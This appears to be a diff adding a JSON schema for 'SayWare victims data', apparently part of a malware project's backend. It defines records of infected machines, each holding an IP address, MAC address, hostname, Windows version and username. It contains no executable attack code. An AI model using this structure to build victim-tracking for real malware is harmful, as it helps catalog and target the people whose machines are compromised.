@@ -1,0 +1,60 @@
+{
+  "title": "SayWare victims data",
+  "description": "Data related to the victims",
+  "type": "array",
+  "items": {
+    "type": "object",
+    "properties": {
+      "identifier": {
+        "type": "string",
+        "format": "uuid",
+        "description": "Unique identifier for this victim"
+      },
+      "address": {
+        "type": [
+          "string",
+          "null"
+        ],
+        "description": "IP address of the victim",
+        "default": null
+      },
+      "operating_system_version": {
+        "type": "string",
+        "description": "Windows version information"
+      },
+      "mac_address": {
+        "type": [
+          "string",
+          "null"
+        ],
+        "description": "MAC address of the victim's network adapter",
+        "default": null
+      },
+      "hostname": {
+        "type": [
+          "string",
+          "null"
+        ],
+        "description": "Computer hostname",
+        "default": null
+      },
+      "username": {
+        "type": [
+          "string",
+          "null"
+        ],
+        "description": "Display name of the current user",
+        "default": null
+      }
+    },
+    "required": [
+      "identifier",
+      "address",
+      "operating_system_version",
+      "mac_address",
+      "hostname",
+      "username"
+    ]
+  },
+  "default": []
+}
